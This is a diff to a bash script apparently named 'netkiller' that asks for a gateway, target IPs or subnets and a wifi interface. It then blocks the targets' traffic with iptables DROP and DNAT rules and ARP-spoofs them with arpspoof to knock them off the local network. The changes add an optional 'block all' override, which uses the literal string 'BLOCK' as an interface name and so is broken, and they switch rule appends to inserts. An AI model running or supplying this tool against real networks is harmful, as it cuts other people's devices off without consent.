@@ -7,6 +7,8 @@ echo "Enter Router Gateway IP:"
 read -p "> " GATEWAY
 echo "Enter Target IP(s) or (space-separated) Multi IP's or Subnet (10.0.0.1/20):"
 read -p "> " TARGET_IPS
+echo "Block All - override subnet (Optional)"
+read -p "> " BLOCK
 echo "Enter Wifi Interface (wlan0):"
 read -p "> " INTERFACE
 
@@ -20,6 +22,8 @@ iptables -t nat -F
 
 # Remove Iptables rules
 cat > /bin/netkiller-stop << EOF
+#!/bin/sh
+
 iptables -F
 iptables -X
 iptables -t nat -F
@@ -39,11 +43,11 @@ for TARGET in $TARGET_IPS; do
     if [[ "$TARGET" =~ / ]]; then
        
         # Block all traffic
-        iptables -A FORWARD -s "$TARGET" -j DROP
-        iptables -A FORWARD -d "$TARGET" -j DROP
-        iptables -A INPUT -s "$TARGET" -j DROP
-        iptables -A OUTPUT -d "$TARGET" -j DROP
-        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+        iptables -I FORWARD -s "$TARGET" -j DROP
+        iptables -I FORWARD -d "$TARGET" -j DROP
+        iptables -I FORWARD -i "BLOCK" -j DROP
+        iptables -I FORWARD -o "BLOCK" -j DROP
+        iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
      
         # Expand subnet for ARP spoofing
         read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
@@ -63,11 +67,9 @@ for TARGET in $TARGET_IPS; do
         fi
     else
         # Single IP
-        iptables -A FORWARD -s "$TARGET" -j DROP
-        iptables -A FORWARD -d "$TARGET" -j DROP
-        iptables -A INPUT -s "$TARGET" -j DROP
-        iptables -A OUTPUT -d "$TARGET" -j DROP
-        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+        iptables -I FORWARD -s "$TARGET" -j DROP
+        iptables -I FORWARD -d "$TARGET" -j DROP
+        iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
  
         (
             arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
